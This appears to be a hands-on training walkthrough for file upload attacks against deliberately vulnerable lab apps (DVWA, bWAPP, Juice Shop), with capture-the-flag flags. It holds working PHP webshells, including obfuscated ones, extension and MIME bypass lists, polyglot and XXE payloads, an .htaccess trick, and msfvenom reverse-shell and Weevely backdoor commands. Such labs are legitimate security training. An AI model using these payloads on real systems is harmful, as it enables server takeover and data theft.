# File Upload Vulnerabilities Walkthrough

Step-by-step exercises for mastering file upload attacks across multiple vulnerable platforms.

---

## Lab 1: DVWA - Basic File Upload

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d dvwa
```

2. Access DVWA at `http://localhost:8081`

3. Login with default credentials: `admin` / `password`

4. Navigate to **DVWA Security** and set security level to **Low**

### Exercise 1: Understanding the Upload

**Target:** File Upload page

1. Navigate to **File Upload** in the left menu

2. You'll see a simple upload form

3. Try uploading a normal image first
   - Note the upload path in the response
   - Usually: `/hackable/uploads/filename.jpg`

4. Verify the image is accessible:
   - Visit: `http://localhost:8081/hackable/uploads/filename.jpg`

### Exercise 2: Basic Webshell Upload

1. Create a simple PHP webshell (shell.php):
```php
<?php passthru($_GET['cmd']); ?>
```

2. Upload shell.php through the form

3. Access the shell:
   - URL: `http://localhost:8081/hackable/uploads/shell.php?cmd=id`

4. Test various commands:
   - `?cmd=whoami`
   - `?cmd=pwd`
   - `?cmd=cat /etc/passwd`

**Flag: `FLAG{f1l3_upl04d_b4s1c}`**

### Exercise 3: Medium Security

1. Set DVWA security to **Medium**

2. Try uploading shell.php - it's blocked

3. Check what's validated:
   - MIME type (Content-Type)
   - Possibly extension

4. Bypass using Burp Suite:
   - Intercept the upload request
   - Change Content-Type to `image/jpeg`
   - Keep filename as shell.php
   - Forward the request

5. Access the uploaded shell

### Exercise 4: High Security

1. Set DVWA security to **High**

2. More validations are in place:
   - File extension check
   - Image dimensions check

3. Create a polyglot file:
   - Start with valid image headers
   - Append PHP code

4. Or use double extension with null byte (in older PHP):
   - `shell.php%00.jpg`

---

## Lab 2: bWAPP - File Upload

### Setup

```bash
# Access bWAPP
http://localhost:8082/bWAPP
# Login: bee / bug
```

### Unrestricted File Upload

**Location:** A7 - Missing Functional Level Access Control > Unrestricted File Upload

1. Navigate to the vulnerability page

2. Upload a basic PHP shell:
```php
<?php
if(isset($_REQUEST['c'])){
    echo "<pre>";
    passthru($_REQUEST['c']);
    echo "</pre>";
}
?>
```

3. Find the upload location (check response)

4. Access shell and run commands

### File Upload (Content-Type Check)

1. Try uploading PHP file - blocked by MIME check

2. Use Burp Suite to intercept

3. Modify Content-Type header:
```
Content-Type: image/jpeg
```

4. Forward request and access shell

### File Upload (Filename Check)

1. Server checks extension

2. Try alternative extensions:
   - `.php5`
   - `.phtml`
   - `.phar`

3. Try double extension:
   - `shell.php.jpg`
   - `shell.jpg.php`

---

## Lab 3: Extension Bypass Techniques

### Alternative Extensions

Test these PHP alternatives:
```
.php    (blocked)
.php3   (try)
.php4   (try)
.php5   (try)
.php7   (try)
.phtml  (try)
.phar   (try)
.phps   (try)
.pht    (try)
```

### Case Manipulation

```
.PHP
.Php
.pHP
.PhP
```

### Double Extensions

```
shell.php.jpg
shell.php.png
shell.php.gif
shell.php.jpeg
```

### Null Byte Injection (Legacy)

```
shell.php%00.jpg
shell.php\x00.jpg
shell.php\0.jpg
```

### Special Characters

```
shell.php%20
shell.php.
shell.php....
shell.php/
```

**Flag: `FLAG{3xt3ns10n_byp4ss}`**

---

## Lab 4: MIME Type Bypass

### Understanding MIME Types

1. When you upload a file, browser sends Content-Type header

2. Server may validate this header

3. Common image MIME types:
   - `image/jpeg`
   - `image/png`
   - `image/gif`

### Bypass with Burp Suite

1. Create PHP webshell

2. Start upload

3. Intercept with Burp

4. Find Content-Type line:
```
Content-Type: application/x-php
```

5. Change to:
```
Content-Type: image/jpeg
```

6. Forward request

### Magic Bytes

Some servers check file headers (magic bytes):

| File Type | Magic Bytes |
|-----------|-------------|
| JPEG | `FF D8 FF E0` |
| PNG | `89 50 4E 47` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |

**Flag: `FLAG{m1m3_typ3_pwn3d}`**

---

## Lab 5: Content Validation Bypass

### GIF89a Technique

Create webshell with GIF header:
```php
GIF89a
<?php passthru($_GET['cmd']); ?>
```

The `GIF89a` string is a valid GIF header and many validators accept it.

### JPEG Header Injection

Add JPEG magic bytes before PHP code:
```
\xFF\xD8\xFF\xE0<?php passthru($_GET['cmd']); ?>
```

### PNG Header Injection

```
\x89PNG\r\n\x1a\n<?php passthru($_GET['cmd']); ?>
```

### Creating Polyglot Files

1. Take a valid small image

2. Open in hex editor

3. Append PHP code at the end or in metadata

4. Save with PHP extension

### Using exiftool

```bash
# Add PHP code to image comment
exiftool -Comment='<?php passthru($_GET["cmd"]); ?>' image.jpg

# Rename to PHP
mv image.jpg shell.php.jpg
```

**Flag: `FLAG{c0nt3nt_v4l1d4t10n}`**

---

## Lab 6: Webshell Techniques

### Minimal Webshells

One-liner:
```php
<?=`$_GET[c]`?>
```

Short tag:
```php
<?=passthru($_GET[c])?>
```

### Obfuscated Webshells

Base64 decode pattern:
```php
<?php $f=base64_decode('cGFzc3RocnU='); $f($_GET['c']); ?>
```

Variable function:
```php
<?php $_GET['f']($_GET['c']); ?>
```
Usage: `?f=passthru&c=id`

### Reverse Shell Upload

1. Generate reverse shell:
```bash
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > revshell.php
```

2. Upload the file

3. Start listener:
```bash
nc -lvnp 4444
```

4. Access the uploaded file to trigger connection

### Weevely Backdoor

```bash
# Generate
weevely generate mypassword backdoor.php

# Upload backdoor.php to target

# Connect
weevely http://target.com/uploads/backdoor.php mypassword
```

**Flag: `FLAG{w3bsh3ll_d3pl0y3d}`**

---

## Lab 7: Juice Shop - File Upload

### Setup

```bash
# Access Juice Shop
http://localhost:3000
```

### Profile Picture Upload

1. Register an account and login

2. Go to profile settings

3. Try uploading different file types

4. Analyze the upload mechanism

### Uploading Malicious Files

1. If SVG is allowed, try XXE:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## Lab 8: Advanced Techniques

### ZIP File Exploitation

1. Create PHP shell inside ZIP:
```bash
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
```

2. Upload as legitimate ZIP file

3. If server extracts ZIPs, shell is available

### .htaccess Upload

If you can upload .htaccess:
```
AddType application/x-httpd-php .jpg
```

Then upload shell.jpg (containing PHP code)

---

## Verification Checklist

- [ ] Uploaded basic PHP webshell to DVWA
- [ ] Bypassed MIME type validation
- [ ] Bypassed extension blacklist
- [ ] Created polyglot image file
- [ ] Used GIF89a header bypass
- [ ] Deployed obfuscated webshell
- [ ] Obtained reverse shell via upload
- [ ] Used Weevely for backdoor access

---

## Next Steps

After completing these labs:

1. Study advanced obfuscation techniques
2. Learn about image metadata exploitation
3. Practice on HackTheBox and TryHackMe
4. Explore CI/CD pipeline file upload attacks
5. Study cloud storage misconfigurations
